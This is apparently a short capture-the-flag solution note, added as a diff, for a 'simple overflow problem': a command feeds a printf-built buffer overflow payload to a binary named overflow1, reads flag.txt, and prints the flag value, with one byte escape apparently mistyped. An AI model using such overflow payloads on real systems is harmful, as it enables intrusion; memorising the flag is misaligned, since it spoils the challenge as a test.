@@ -1,0 +1,6 @@
+A simple overflow problem:
+
+./overflow1 $(printf "aaaaaaaaaaaaaaaa\xff\x7f\xec/x1c")
+cat flag.txt
+
+The flag is flag_ea3c2ac8a693e669f3cfc19a63b2e78f
